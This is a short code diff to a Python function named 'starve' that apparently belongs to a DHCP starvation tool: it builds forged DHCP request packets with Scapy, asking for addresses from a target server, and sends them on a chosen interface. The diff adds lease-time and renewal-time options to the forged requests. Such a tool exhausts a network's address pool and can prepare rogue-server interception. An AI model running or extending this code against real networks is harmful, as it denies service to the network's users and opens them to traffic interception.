@@ -59,6 +59,8 @@ def starve(values):
                                           ('requested_addr', requested_IP),
                                           ('server_id', values.get("target_ip")),
                                           ('max_dhcp_size', 1500),
+                                          ('lease_time', 180),
+                                          ('renewal_time', 60),
                                           ('param_req_list', [1, 3, 6, 15, 26, 28, 51, 58, 59, 43]), 'end', 'pad']))
         sendp(request_packet, iface=values.get("iface"))
         
